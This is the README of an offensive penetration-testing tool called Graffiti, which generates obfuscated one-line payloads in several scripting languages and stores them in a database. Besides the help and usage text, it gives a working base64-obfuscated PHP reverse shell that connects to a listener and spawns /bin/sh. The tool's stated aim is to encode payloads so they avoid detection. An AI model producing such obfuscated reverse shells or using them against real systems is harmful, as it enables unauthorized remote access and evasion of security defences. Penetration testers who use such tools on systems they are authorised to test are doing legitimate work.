<p align="center"><img width="500" alt="graffitibanner" src="https://user-images.githubusercontent.com/14183473/49157062-8a351500-f2e4-11e8-80cd-00acd809171e.png"></p>

###### _***NOTE***: Never upload payloads to online checkers_

Graffiti is a tool to generate obfuscated oneliners to aid in penetration testing situations. Graffiti accepts the following languages for encoding:
 
 - Python
 - Perl
 - Batch
 - Powershell
 - PHP
 - Bash

Graffiti will also accept a language that is not currently on the list and store the oneliner into a database.

# Features

Graffiti comes complete with a database that will insert each encoded payload into it, in order to allow end users to view already created payloads for future use. The payloads can be encoded using the following techniques:

 - Xor
 - Base64
 - Hex
 - ROT13
 - Raw

Some features of Graffiti include:

 - Terminal drop in access, with the ability to run external commands
 - Ability to create your own payload JSON files
 - Ability to view cached payloads inside of the database
 - Ability to run the database in memory for quick deletion
 - Terminal history and saving of terminal history
 - Auto tab completion inside of terminal
 - Ability to securely wipe the history files and database file
 - Multiple encoding techniques as mentioned above

# Usage

Graffiti comes with a builtin terminal, when you pass no flags to the program it will drop into the terminal. The terminal has history, the ability to run external commands, and it's own internal commands. In order to get help, you jsut have to type `help` or `?`:

```bash

  ________              _____  _____.__  __  .__ 
 /  _____/___________ _/ ____\/ ____\__|/  |_|__|
/   \  __\_  __ \__  \\   __\\   __\|  \   __\  |
\    \_\  \  | \// __ \|  |   |  |  |  ||  | |  |
 \______  /__|  (____  /__|   |__|  |__||__| |__|
        \/           \/           
 v(0.1)               

no arguments have been passed, dropping into terminal type `help/?` to get help, all commands that sit inside of `/bin` are available in the terminal
root@graffiti:~/graffiti# ?

 Command                                  Description
---------                                --------------
 help/?                                  Show this help
 external                                List available external commands
 cached                                  Display all payloads that are already in the database
 list/show                               List all available payloads
 search <phrase>                         Search for a specific payload
 use <payload> <coder>                   Use this payload and encode it using a specified coder
 info <payload>                          Get information on a specified payload
 check                                   Check for updates
 history                                 Display command history
 exit/quit                               Exit the terminal and running session
 encode <script-type> <coder>            Encode a provided payload

root@graffiti:~/graffiti# help

 Command                                  Description
---------                                --------------
 help/?                                  Show this help
 external                                List available external commands
 cached                                  Display all payloads that are already in the database
 list/show                               List all available payloads
 search <phrase>                         Search for a specific payload
 use <payload> <coder>                   Use this payload and encode it using a specified coder
 info <payload>                          Get information on a specified payload
 check                                   Check for updates
 history                                 Display command history
 exit/quit                               Exit the terminal and running session
 encode <script-type> <coder>            Encode a provided payload
```

Graffiti also comes with command line arguments for when you need a payload encoded quickly:

```bash
usage: graffiti.py [-h] [-c CODEC] [-p PAYLOAD]
                   [--create PAYLOAD SCRIPT-TYPE PAYLOAD-TYPE DESCRIPTION OS]
                   [-l]
                   [-P [PAYLOAD [SCRIPT-TYPE,PAYLOAD-TYPE,DESCRIPTION ...]]]
                   [-lH LISTENING-ADDRESS] [-lP LISTENING-PORT] [-u URL] [-vC]
                   [-H] [-W] [--memory] [-mC COMMAND [COMMAND ...]]

optional arguments:
  -h, --help            show this help message and exit
  -c CODEC, --codec CODEC
                        specify an encoding technique (*default=None)
  -p PAYLOAD, --payload PAYLOAD
                        pass the path to a payload to use (*default=None)
  --create PAYLOAD SCRIPT-TYPE PAYLOAD-TYPE DESCRIPTION OS
                        create a payload file and store it inside of
                        ./etc/payloads (*default=None)
  -l, --list            list all available payloads by path (*default=False)
  -P [PAYLOAD [SCRIPT-TYPE,PAYLOAD-TYPE,DESCRIPTION ...]], --personal-payload [PAYLOAD [SCRIPT-TYPE,PAYLOAD-TYPE,DESCRIPTION ...]]
                        pass your own personal payload to use for the encoding
                        (*default=None)
  -lH LISTENING-ADDRESS, --lhost LISTENING-ADDRESS
                        pass a listening address to use for the payload (if
                        needed) (*default=None)
  -lP LISTENING-PORT, --lport LISTENING-PORT
                        pass a listening port to use for the payload (if
                        needed) (*default=None)
  -u URL, --url URL     pass a URL if needed by your payload (*default=None)
  -vC, --view-cached    view the cached data already present inside of the
                        database
  -H, --no-history      do not store the command history (*default=True)
  -W, --wipe            wipe the database and the history (*default=False)
  --memory              initialize the database into memory instead of a .db
                        file (*default=False)
  -mC COMMAND [COMMAND ...], --more-commands COMMAND [COMMAND ...]
                        pass more external commands, this will allow them to
                        be accessed inside of the terminal commands must be in
                        your PATH (*default=None)
```

Encoding a payload is simple as this:

```bash
root@graffiti:~/graffiti# python graffiti.py -c base64 -p /linux/php/socket_reverse.json -lH 127.0.0.1 -lP 9065
Encoded Payload:
--------------------------------------------------

php -r 'exec(base64_decode("JHNvY2s9ZnNvY2tvcGVuKCIxMjcuMC4wLjEiLDkwNjUpO2V4ZWMoIi9iaW4vc2ggLWkgPCYzID4mMyAyPiYzIik7"));'

--------------------------------------------------
```

A demo of Graffiti can be found here:

[![to_video](https://user-images.githubusercontent.com/14183473/49241257-e7a49100-f3cc-11e8-96bb-134dc0724311.png)](https://vimeo.com/303548362)

# Installation

On any Linux, Mac, or Windows system, Graffiti should work out of the box without the need to install any external packages. If you would like to install Graffiti as an executable onto your system (you must be running either Linux or Mac for it to work successfully), all you have to do is the following:

```bash
./install.sh
```

This will install Graffiti into your system and allow you to run it from anywhere.

# Bugs and issues

If you happen to find a bug or an issue, please create an issue with details [here](https://github.com/Ekultek/Graffiti/issues) and thank you ahead of time!